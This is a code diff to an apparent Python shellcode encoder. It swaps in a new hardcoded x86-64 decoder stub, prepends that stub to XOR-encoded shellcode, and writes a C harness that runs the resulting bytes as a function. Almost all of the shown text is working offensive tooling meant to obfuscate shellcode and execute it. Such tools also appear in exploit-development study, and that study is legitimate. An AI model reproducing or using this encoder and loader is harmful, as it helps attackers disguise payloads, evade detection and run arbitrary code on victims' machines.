@@ -21,7 +21,7 @@ KNOWN_ASM_INSTRUCTIONS = {
     "_start:": {"parsing_args": [], "equivalent_mods": []},
     }
 
-ENCODER_STUD = "\\xeb\\x5f\\x48\\x31\\xc0\\x48\\x31\\xdb\\x48\\x31\\xc9\\x48\\x31\\xd2\\x5e\\xbf\\x90\\x90\\xaa\\xaa\\x48\\x83\\xec\\x7f\\x48\\x83\\xec\\x7f\\x48\\x83\\xec\\x7f\\x48\\x83\\xec\\x7f\\x8a\\x5c\\x16\\x01\\x8a\\x7c\\x16\\x02\\x8a\\x4c\\x16\\x03\\x8a\\x6c\\x16\\x04\\x32\\x1c\\x16\\x32\\x3c\\x16\\x32\\x0c\\x16\\x32\\x2c\\x16\\x88\\x2c\\x04\\x88\\x4c\\x04\\x01\\x88\\x7c\\x04\\x02\\x88\\x5c\\x04\\x03\\x39\\x7c\\x16\\x05\\x74\\x0a\\x48\\x83\\xc2\\x05\\x48\\x83\\xc0\\x04\\x75\\xc5\\xff\\xe4\\xe8\\x9c\\xff\\xff\\xff"
+ENCODER_STUD = "\\xe9\\x8f\\x00\\x00\\x00\\x48\\x31\\xc0\\x48\\x31\\xc9\\x48\\x31\\xdb\\x48\\x31\\xd2\\x48\\x83\\xc1\\x04\\x88\\xcd\\x88\\xd9\\x5e\\xbf\\x90\\x90\\xaa\\xaa\\x48\\x83\\xec\\x7f\\x48\\x83\\xec\\x7f\\x48\\x83\\xec\\x7f\\x48\\x83\\xec\\x7f\\x88\\xe9\\xfe\\xc9\\xfe\\xc3\\xfe\\xc5\\x4d\\x31\\xc9\\x4d\\x31\\xd2\\x30\\xff\\x49\\x89\\xd1\\x48\\x01\\xda\\x8a\\x3c\\x16\\x4c\\x89\\xca\\x32\\x3c\\x16\\x49\\x89\\xc1\\x41\\x88\\xca\\x4d\\x01\\xca\\x4c\\x89\\xd0\\x88\\x3c\\x04\\x4c\\x89\\xc8\\xfe\\xc3\\xfe\\xc9\\x38\\xeb\\x75\\xcf\\x88\\xe9\\x30\\xed\\x31\\xdb\\x4d\\x31\\xd2\\x49\\x89\\xd1\\x41\\x88\\xca\\x4d\\x01\\xca\\x4c\\x89\\xd2\\x39\\x3c\\x16\\x74\\x10\\x4c\\x89\\xca\\x48\\x01\\xca\\x48\\xff\\xc9\\x48\\x01\\xc8\\x88\\xcd\\x75\\x9d\\xff\\xe4\\xe8\\x6c\\xff\\xff\\xff"
 ASM_HELPER_FILE = "asm_helper.json"
 
 # Parses asm instructions line, returns Dict with parsed instructions
@@ -352,18 +352,18 @@ def encode_shell_code(shell_code_bytes_strings):
     shell_code_encoded.append(0xaa)
 
     shell_code_encoded_hex = ''.join('\\x{:02x}'.format(x) for x in shell_code_encoded)
-    #shellcode_encoded_nasm = ''.join('0x{:02x},'.format(x) for x in shell_code_encoded).rstrip(',')
-    print(f"Original ShellCode: {shell_code_bytes_strings}\n")
-    print(f"Encoded ShellCode: {shell_code_encoded_hex}\n")
-    print(f"Encoder Stud + Encoded ShellCode: {ENCODER_STUD+shell_code_encoded_hex}")
-    
-    write_payloadc(shell_code_encoded_hex)
+    shellcode_encoded_nasm = ''.join('0x{:02x},'.format(x) for x in shell_code_encoded).rstrip(',')
+    print(f"Generated ShellCode: {shell_code_bytes_strings}\n")
+    print(f"Encoded Gen ShellCode: {shell_code_encoded_hex}\n")
+    #print(f"Encoded Gen ShellCode asm: {shellcode_encoded_nasm}\n")
+    print(f"Encoder Stud + Encoded Gen ShellCode: {ENCODER_STUD+shell_code_encoded_hex}")
+    write_payloadc(ENCODER_STUD+shell_code_encoded_hex)
 
 def write_payloadc(payload):
     payloadc_file = "payload.c"
-    payload = payload.replace("\\", "\\\\")
+    #payload = payload.replace("\\", "\\\\")
     with open(payloadc_file, 'w') as f:
-        content = 'int main(int argc, char **argv){char code[] = "'+ payload +'";int (*func)();func = (int (*)())code;(int)(*func)()}'
+        content = 'int main(int argc, char **argv){char code[] = "'+ payload +'";int (*func)();func = (int (*)())code;(int)(*func)();}'
         f.write(content)
 
 if __name__ == '__main__':
